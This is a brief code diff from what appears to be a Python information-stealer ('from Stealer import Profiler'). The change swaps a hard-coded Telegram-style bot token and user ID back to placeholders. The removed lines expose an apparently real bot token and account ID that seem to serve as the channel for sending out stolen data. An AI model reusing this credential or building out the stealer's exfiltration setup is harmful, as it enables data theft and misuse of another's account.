@@ -10,11 +10,8 @@ from warnings import warn
 
 from Stealer import Profiler
 
-#BOT_TOKEN: str = "<BOT TOKEN>"
-#USER_ID: int = "<YOUR USER ID (int)>"
-
-BOT_TOKEN: str = "8877574097:AAGJ9P-i073tdFIlzO9QxE5zHFQM5l7ZGs0"
-USER_ID: int = 998453903
+BOT_TOKEN: str = "<BOT TOKEN>"
+USER_ID: int = "<YOUR USER ID (int)>"
 
 async def main():
     print("Loading bot...")
